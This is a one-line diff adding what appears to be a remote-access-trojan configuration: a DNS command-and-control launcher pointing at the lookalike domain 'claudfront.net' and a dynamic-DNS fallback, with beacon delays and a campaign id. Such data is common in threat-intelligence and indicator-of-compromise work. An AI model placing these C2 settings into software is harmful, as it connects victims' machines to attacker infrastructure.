@@ -1,0 +1,1 @@
+launcher_args:['--domain', 'claudfront.net', '-E', 'dynamic-dns.net'],cid:3131805103,launcher:dnscnc,delays:[(10, 5, 10), (50, 30, 50), (-1, 150, 300)],
